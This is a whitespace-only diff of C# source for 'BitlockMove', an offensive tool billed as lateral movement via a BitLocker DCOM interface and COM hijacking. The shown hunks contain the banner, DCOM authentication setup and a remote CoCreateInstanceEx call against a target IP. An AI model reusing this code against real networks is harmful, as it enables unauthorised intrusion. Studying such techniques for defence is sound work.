@@ -21,17 +21,17 @@ namespace BitlockMove
         {
             Console.WriteLine(@"
 
-    ______ _ _   _            _   ___  ___               
-    | ___ (_) | | |          | |  |  \/  |               
-    | |_/ /_| |_| | ___   ___| | _| .  . | _____   _____ 
+    ______ _ _   _            _   ___  ___
+    | ___ (_) | | |          | |  |  \/  |
+    | |_/ /_| |_| | ___   ___| | _| .  . | _____   _____
     | ___ \ | __| |/ _ \ / __| |/ / |\/| |/ _ \ \ / / _ \
     | |_/ / | |_| | (_) | (__|   <| |  | | (_) \ V /  __/
     \____/|_|\__|_|\___/ \___|_|\_\_|  |_/\___/ \_/ \___|
-            
+
     Lateral Movement via Bitlocker DCOM interface & COM Hijacking
                                           by @ShitSecure
     ");
-            
+
             string targetIP = null;
             /*string username = null; custom user for execution removed for reasons
             string password = null;
@@ -126,14 +126,14 @@ namespace BitlockMove
                     break;
             }
 
-            
+
             // Ensure that if username, password, and domain are provided, they are valid
             /*if (username != null && password != null && domain != null)
             {
                 Server.Execute(targetIP, null, username, password, domain);
             }*/
-            
-            
+
+
         }
     }
 
@@ -290,7 +290,7 @@ namespace BitlockMove
         private const int EOAC_NONE = 0;
         private const int SEC_WINNT_AUTH_IDENTITY_UNICODE = 2;
 
-        
+
         public static void InitAuthStructs(ref COAUTHINFO authInfo)
         {
             authInfo.dwAuthnSvc = RPC_C_AUTHN_WINNT;
@@ -358,7 +358,7 @@ namespace BitlockMove
                     pAuthInfo = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(COAUTHINFO)));
                     Marshal.StructureToPtr(authInfo, pAuthInfo, false);
                 }
-                
+
                 // Create server info
                 COSERVERINFO serverInfo = new COSERVERINFO
                 {
@@ -372,12 +372,12 @@ namespace BitlockMove
 
 
                 MULTI_QI[] qis = new MULTI_QI[1];
-                
-                
+
+
                 Guid iid = new Guid("8961F0A0-FF62-403B-91B4-7B9280241CEB");
                 IntPtr iid_ptr = GuidToPointer(iid);
                 qis[0] = new MULTI_QI(iid);
-               
+
                 int hr = CoCreateInstanceEx(clsid, IntPtr.Zero, CLSCTX.REMOTE_SERVER, serverInfoPtr, 1, qis);
                 if (hr != 0)
                 {
@@ -389,13 +389,13 @@ namespace BitlockMove
                     Console.WriteLine("[+] CoCreateInstanceEx succeeded!");
                 }
 
-                
+
                 if (qis[0].hr != 0)
                 {
                     throw new COMException("[-] Failed to retrieve interface", (int)qis[0].hr);
                 }
-                
-                
+
+
                 if (qis[0].pItf == IntPtr.Zero)
                 {
                     throw new Exception("[-] CoCreateInstanceEx returned a null interface pointer.");
